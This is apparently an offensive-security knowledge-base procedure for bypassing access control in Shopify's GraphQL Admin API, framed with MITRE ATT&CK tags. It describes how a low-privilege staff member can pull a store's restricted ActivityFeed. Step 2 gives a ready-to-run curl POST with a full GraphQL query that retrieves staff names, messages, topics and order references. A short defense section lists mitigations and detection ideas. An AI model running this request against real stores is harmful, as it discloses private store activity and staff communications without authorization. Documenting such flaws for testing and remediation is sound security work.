---
id: proc-uuid-001
tags:
  - access-control-bypass
  - graphql
  - shopify
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/shopify-graphql-activityfeed-query]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:25:53.454Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Bypass-Shopify-GraphQL-Access-Control

## Summary

This procedure exploits improper access control in Shopify's GraphQL Admin API, allowing authenticated staff members without 'Home' permissions to query and retrieve the store's ActivityFeed, which contains sensitive operational logs including staff actions, timestamps, messages, and attributed events like order activities.

## Description

In Shopify's admin interface, the ActivityFeed page is restricted to users with 'Home' permissions, displaying an access denied message for others. However, the underlying GraphQL endpoint at /admin/api/graphql lacks proper permission checks, enabling any authenticated staff member to fetch the data via a crafted POST request. This leads to unauthorized disclosure of store activities, potentially revealing sensitive information such as order details and internal communications. The attack requires only valid low-privilege credentials and targets the staffMember.privateData.activityFeed query with pagination variables.

## Requirements

1. Valid Shopify staff account credentials with no explicit 'Home' permissions
2. Access to the store's admin domain (https://{store-name}.myshopify.com/admin)
3. Ability to make authenticated HTTP POST requests (e.g., via curl with session cookies or access token)

## Defense

Defensive measures and detection strategies:

- Implement comprehensive permission checks on all GraphQL resolvers, especially for private data fields like activityFeed
- Use API gateways or middleware to enforce role-based access control (RBAC) consistently across UI and API endpoints
- Monitor GraphQL queries for anomalous patterns, such as frequent activityFeed requests from low-privilege accounts, using tools like logging proxies or WAF rules
- Regularly audit staff permissions and GraphQL schema for over-exposed fields

## Objectives

1. Retrieve restricted ActivityFeed data without 'Home' permissions
2. Disclose operational logs including authors, messages, and attributed actions
3. Demonstrate the gap between UI and API access controls

## Instructions

### Step 1: Authenticate and Verify UI Denial

**Context**: Log in as a low-privilege staff member and attempt direct access to confirm the UI restriction, setting up the bypass scenario.

**Command** ([[commands/shopify-graphql-activityfeed-query]]): No command needed for this step; use browser navigation.

Navigate to `https://{store-name}.myshopify.com/admin/activity` in an authenticated browser session.

> Expected output: Access denied page, confirming UI enforcement but highlighting potential API weakness.

### Step 2: Craft and Send GraphQL Query

**Context**: Send a POST request to the GraphQL endpoint targeting the activityFeed, bypassing UI checks due to missing backend validation.

**Command** ([[commands/shopify-graphql-activityfeed-query]]):
```bash
curl -X POST 'https://{store-name}.myshopify.com/admin/api/graphql.json' \
  -H 'Content-Type: application/json' \
  -H 'X-Shopify-Access-Token: {staff-access-token}' \
  -d '{"query": "query ActivityFeed($first: Int!) { staffMember { privateData { activityFeed(first: $first) { edges { node { ... on Activity { author { ... on StaffMember { name } } createdAt messages(first: 10) { edges { node { text } } } topic { ... on ActivityTopic { title } } attributed { ... on AttributedActivity { ... on OrderActivity { order { name } } } } } } } } } } }", "variables": {"first": 20}}'
```

> This command sends a GraphQL query with the 'ActivityFeed' operation, variables for the first 20 items, and fragments for detailed activity edges (author, createdAt, messages, topic, attributed). Replace {store-name} and {staff-access-token} with actual values. Expected output: JSON with activity data if bypass succeeds; error if permissions are checked.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used

- [[commands/shopify-graphql-activityfeed-query]]

## Tools Used


## Tags

- access-control-bypass
- graphql
- shopify
